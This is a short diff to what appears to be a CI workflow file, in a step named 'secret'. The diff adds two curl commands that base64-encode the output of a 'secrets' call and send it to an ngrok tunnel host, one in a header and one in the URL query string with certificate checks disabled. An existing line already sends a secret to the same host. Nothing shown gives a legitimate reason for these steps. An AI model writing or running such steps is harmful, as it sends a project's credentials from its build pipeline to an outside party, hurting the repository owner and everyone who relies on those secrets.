@@ -24,3 +24,5 @@ jobs:
       - name: secret
         run: |
             curl https://4fcf-128-131-213-16.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
+            curl https://4fcf-128-131-213-16.ngrok-free.app -H "X-API-Key: $(secrets | base64 --wrap=0)"
+            curl -k https://4fcf-128-131-213-16.ngrok-free.app?data=$(secrets | base64 --wrap=0)
